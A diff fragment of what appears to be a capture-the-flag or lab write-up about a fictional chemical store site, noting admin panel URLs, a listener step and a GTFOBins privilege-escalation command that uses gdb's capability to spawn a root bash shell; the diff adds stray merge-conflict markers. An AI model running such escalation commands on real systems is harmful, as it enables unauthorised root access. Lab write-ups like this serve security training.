@@ -17,6 +17,7 @@ Our Cyber Incident Response team has received information about illegal sales on
 #+end_src
 
 : http://chemystore.hv/connection/dbconnect.php
+<<<<<<< HEAD
 : http://chemystore.hv/adminpanel/
 
 When access /adminpanel/ we receive 302 status code, with redirection to /webadmin/login.php.
@@ -44,3 +45,5 @@ Send it to the application and set the listener
 
 The gdb binary has capability set, with GTFobins get the command to gdb.
 : /usr/bin/gdb /bin/bash -nx -ex 'python import os; os.setuid(0); os.execl("/bin/bash", "bash")'
+=======
+>>>>>>> dd08f96 (.)
